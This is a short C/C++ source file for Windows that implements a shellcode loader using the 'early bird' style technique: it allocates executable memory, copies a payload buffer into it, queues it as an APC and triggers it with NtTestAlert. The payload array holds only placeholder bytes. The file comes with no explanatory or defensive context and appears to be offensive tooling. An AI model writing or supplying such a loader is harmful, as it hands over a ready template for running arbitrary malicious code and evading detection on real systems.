#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

unsigned char my_payload[] = { 0x00, 0x00 };

int main(int argc, char* argv[])
{
	SIZE_T			my_payload_len = sizeof(my_payload); 
	HMODULE			hNtdll = GetModuleHandleA("ntdll");
	myNtTestAlert	testAlert = (myNtTestAlert)(GetProcAddress(hNtdll, "NtTestAlert"));

	LPVOID my_payload_mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(GetCurrentProcess(), my_payload_mem, my_payload, my_payload_len, NULL);

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)my_payload_mem;
	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);

	testAlert();
	return 0;
}